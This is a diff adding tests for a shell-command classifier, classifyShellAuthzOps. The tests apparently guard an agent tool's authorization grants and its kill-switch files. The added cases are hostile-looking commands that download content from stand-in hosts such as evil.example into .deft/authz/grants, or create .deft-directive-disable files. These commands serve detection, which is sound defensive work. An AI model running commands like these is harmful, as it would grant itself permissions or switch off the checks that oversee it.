@@ -601,6 +601,89 @@ describe("classifyShellAuthzOps (#2944)", () => {
     expect(classifyShellAuthzOps("pax -r -f archive.pax /tmp/out")).toEqual([]);
   });
 
+  it("classifies residual writer plants of authz grants and kill-switch as settings (#3336)", () => {
+    // Finding 1: residual bins → .deft/authz/**
+    for (const cmd of [
+      "oras pull -o .deft/authz/grants/evil.json ghcr.io/evil/g:latest",
+      "oras pull --output .deft/authz/grants/evil.json ghcr.io/evil/g:latest",
+      "oras pull --output=.deft/authz/grants/evil.json ghcr.io/evil/g:latest",
+      "lwp-download -o .deft/authz/grants/evil.json https://evil.example/g.json",
+      "lwp-download https://evil.example/g.json .deft/authz/grants/evil.json",
+      "ncat -o .deft/authz/grants/evil.json evil.example 80",
+      "ncat --output .deft/authz/grants/evil.json evil.example 80",
+      "patch -o .deft/authz/grants/evil.json < src.patch",
+      "patch --output .deft/authz/grants/evil.json src.patch",
+      "base32 -d -o .deft/authz/grants/evil.json encoded.b32",
+      "base32 --decode --output .deft/authz/grants/evil.json encoded.b32",
+      "lrzip -o .deft/authz/grants/evil.json file.lrz",
+      "lrzip --outfile .deft/authz/grants/evil.json file.lrz",
+      "lrzip --outfile=.deft/authz/grants/evil.json file.lrz",
+      "unar -o .deft/authz/grants archive.rar",
+      "unar -output-directory .deft/authz/grants archive.rar",
+      "cabextract -d .deft/authz/grants a.cab",
+      "cabextract -d.deft/authz/grants a.cab",
+      "ditto src .deft/authz/grants/",
+      "dpkg-deb -x pkg.deb .deft/authz/grants",
+      "dpkg-deb --extract pkg.deb .deft/authz/grants",
+      "hg clone https://evil.example/repo .deft/authz/grants/evil",
+      "hg archive -o .deft/authz/grants/evil.json",
+      "msguniq -o .deft/authz/grants/evil.json messages.po",
+      "msguniq --output-file .deft/authz/grants/evil.json messages.po",
+      "oras.exe pull -o .deft/authz/grants/evil.json ghcr.io/evil/g:latest",
+      "/usr/bin/ncat -o .deft/authz/grants/evil.json evil.example 80",
+    ]) {
+      expect(classifyShellAuthzOps(cmd), cmd).toContain("settings");
+      expect(classifyShellAuthzOps(cmd), cmd).not.toEqual([]);
+    }
+    // Finding 2: same bins → kill-switch basenames (regular-file plant).
+    for (const cmd of [
+      "oras pull -o .deft-directive-disable ghcr.io/evil/x:latest",
+      "lwp-download -o .deft-directive-disable https://evil.example/x",
+      "ncat -o .deft-directive-disable evil.example 80",
+      "patch -o .no-deft-directive src.patch",
+      "base32 -d -o .deft-directive-disable encoded.b32",
+      "lrzip -o .deft-directive-disable file.lrz",
+      "unar -o .deft-directive-disable archive.rar",
+      "cabextract -d .deft-directive-disable a.cab",
+      "ditto src .deft-directive-disable",
+      "dpkg-deb -x pkg.deb .deft-directive-disable",
+      "hg clone https://evil.example/repo .deft-directive-disable",
+      "msguniq -o .no-deft-directive messages.po",
+    ]) {
+      expect(classifyShellAuthzOps(cmd), cmd).toContain("settings");
+      expect(classifyShellAuthzOps(cmd), cmd).not.toEqual([]);
+    }
+    // Already-denied #3311 peers stay settings.
+    expect(classifyShellAuthzOps("gpg2 -o .deft/authz/grants/evil.json -d secret.gpg")).toContain(
+      "settings",
+    );
+    expect(classifyShellAuthzOps("rage -d -o .deft/authz/grants/evil.json secret.age")).toContain(
+      "settings",
+    );
+    expect(
+      classifyShellAuthzOps("xh -o .deft/authz/grants/evil.json https://evil.example/g.json"),
+    ).toContain("settings");
+    expect(
+      classifyShellAuthzOps("wcurl -o .deft/authz/grants/evil.json https://evil.example/g.json"),
+    ).toContain("settings");
+    expect(
+      classifyShellAuthzOps("curl -o .deft/authz/grants/evil.json https://evil.example/g.json"),
+    ).toContain("settings");
+    // Ordinary residual-bin destinations stay unclassifiable (no overclassify).
+    expect(classifyShellAuthzOps("oras pull -o /tmp/out ghcr.io/example/g:latest")).toEqual([]);
+    expect(classifyShellAuthzOps("lwp-download -o /tmp/out https://example.com/a")).toEqual([]);
+    expect(classifyShellAuthzOps("ncat -o /tmp/out example.com 80")).toEqual([]);
+    expect(classifyShellAuthzOps("patch -o /tmp/out src.patch")).toEqual([]);
+    expect(classifyShellAuthzOps("base32 -d -o /tmp/out encoded.b32")).toEqual([]);
+    expect(classifyShellAuthzOps("lrzip -o /tmp/out file.lrz")).toEqual([]);
+    expect(classifyShellAuthzOps("unar -o /tmp/out archive.rar")).toEqual([]);
+    expect(classifyShellAuthzOps("cabextract -d /tmp/out a.cab")).toEqual([]);
+    expect(classifyShellAuthzOps("ditto src /tmp/out")).toEqual([]);
+    expect(classifyShellAuthzOps("dpkg-deb -x pkg.deb /tmp/out")).toEqual([]);
+    expect(classifyShellAuthzOps("hg clone https://example.com/repo /tmp/out")).toEqual([]);
+    expect(classifyShellAuthzOps("msguniq -o /tmp/out messages.po")).toEqual([]);
+  });
+
   it("classifies obfuscated programmatic authz-capable writes as settings (#3186)", () => {
     // Base64/byte path construction — residual after #3110 literal path match.
     expect(
